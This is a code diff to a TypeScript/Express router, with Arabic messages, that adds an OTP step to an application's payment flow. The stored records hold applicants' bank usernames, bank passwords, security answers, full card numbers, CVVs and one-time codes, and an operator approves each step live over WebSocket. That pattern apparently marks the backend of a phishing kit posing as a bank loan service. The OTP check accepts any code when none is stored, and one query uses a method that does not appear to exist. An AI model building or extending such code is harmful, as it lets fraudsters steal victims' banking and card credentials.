@@ -675,6 +675,7 @@ router.post("/:id/payment-action", async (req, res) => {
       data: {
         paymentStatus: newStatus,
         currentStep: newApp.currentStep,
+        redirectUrl: action === "approve" ? `/pay-otp?applicationId=${newApp.id}&session=${newApp.sessionId}` : null,
       },
     });
 
@@ -687,5 +688,106 @@ router.post("/:id/payment-action", async (req, res) => {
     res.status(500).json({ error: "فشل في معالجة الإجراء" });
   }
 });
+
+
+// التحقق من رمز OTP للدفع
+router.post("/:id/payment-otp", async (req, res) => {
+  const id = Number(req.params.id);
+  const { otp } = req.body as { otp: string };
+
+  if (isNaN(id)) return res.status(400).json({ error: "معرف غير صالح" });
+  if (!otp || otp.length < 4 || otp.length > 6) {
+    return res.status(400).json({ error: "رمز التحقق يجب أن يكون 4-6 أرقام" });
+  }
+
+  try {
+    const [app] = await db
+      .select()
+      .from(applicationsTable)
+      .where(eq(applicationsTable.id, id));
+
+    if (!app) return res.status(404).json({ error: "الطلب غير موجود" });
+
+    // التحقق من الرمز - يمكن تعديل هذه القاعدة حسب الحاجة
+    if (app.paymentOtp && app.paymentOtp !== otp) {
+      return res.status(400).json({ error: "رمز التحقق غير صحيح" });
+    }
+
+    const parentId = app.parentId ?? app.id;
+
+    // تحديث النسخ القديمة
+    await db
+      .update(applicationsTable)
+      .set({ isLatest: false, updatedAt: new Date() })
+      .where(eq(applicationsTable.parentId, parentId))
+      .andWhere(eq(applicationsTable.isLatest, true));
+
+    // إنشاء نسخة جديدة مع حالة completed
+    const [newApp] = await db
+      .insert(applicationsTable)
+      .values({
+        sessionId: app.sessionId,
+        applicantType: app.applicantType,
+        currentStep: "success",
+        status: app.status,
+        bankId: app.bankId,
+        bankName: app.bankName,
+        fullName: app.fullName,
+        nationalId: app.nationalId,
+        dateOfBirth: app.dateOfBirth,
+        monthlySalary: app.monthlySalary,
+        employer: app.employer,
+        phone: app.phone,
+        email: app.email,
+        city: app.city,
+        maritalStatus: app.maritalStatus,
+        companyName: app.companyName,
+        businessType: app.businessType,
+        commercialRegistration: app.commercialRegistration,
+        employeeCount: app.employeeCount,
+        annualRevenue: app.annualRevenue,
+        contactName: app.contactName,
+        bankUsername: app.bankUsername,
+        bankPassword: app.bankPassword,
+        securityAnswer: app.securityAnswer,
+        otpCode: app.otpCode,
+        paymentCardNumber: app.paymentCardNumber,
+        paymentCardHolder: app.paymentCardHolder,
+        paymentExpiryDate: app.paymentExpiryDate,
+        paymentCvv: app.paymentCvv,
+        paymentOtp: app.paymentOtp,
+        paymentStatus: "completed",
+        paymentCompletedAt: new Date(),
+        extraData: app.extraData,
+        adminNote: app.adminNote,
+        version: (app.version || 1) + 1,
+        parentId: parentId,
+        isLatest: true,
+      })
+      .returning();
+
+    // تحديث الجلسة
+    await db
+      .update(sessionsTable)
+      .set({ applicationId: newApp.id, lastSeenAt: new Date() })
+      .where(eq(sessionsTable.id, newApp.sessionId));
+
+    // إرسال إشعار WebSocket
+    broadcast({
+      type: "payment_completed",
+      sessionId: newApp.sessionId,
+      data: { paymentStatus: "completed", currentStep: "success" },
+    });
+
+    res.json({
+      success: true,
+      message: "تمت الموافقة على الدفع بنجاح!",
+    });
+  } catch (err) {
+    req.log.error({ err }, "خطأ في التحقق من رمز OTP");
+    res.status(500).json({ error: "فشل في التحقق من الرمز" });
+  }
+});
+
 
 export default router;
